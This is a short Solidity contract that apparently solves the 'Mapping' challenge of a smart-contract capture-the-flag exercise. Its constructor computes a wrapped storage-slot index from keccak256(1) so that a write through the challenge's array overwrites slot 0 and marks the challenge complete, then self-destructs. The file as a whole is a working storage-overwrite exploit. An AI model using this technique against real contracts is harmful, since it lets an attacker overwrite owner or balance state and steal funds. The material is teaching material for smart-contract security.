pragma solidity ^0.4.21;

import "./MappingChallenge.sol";

contract MappingSolver {
    MappingChallenge public challenge;

    function MappingSolver(address _challenge) public payable {
        challenge = MappingChallenge(_challenge);
        challenge.set(uint256(-1) - uint256(keccak256(uint256(1))) + 1, 1);
        require(challenge.isComplete());
        selfdestruct(msg.sender);
    }

}
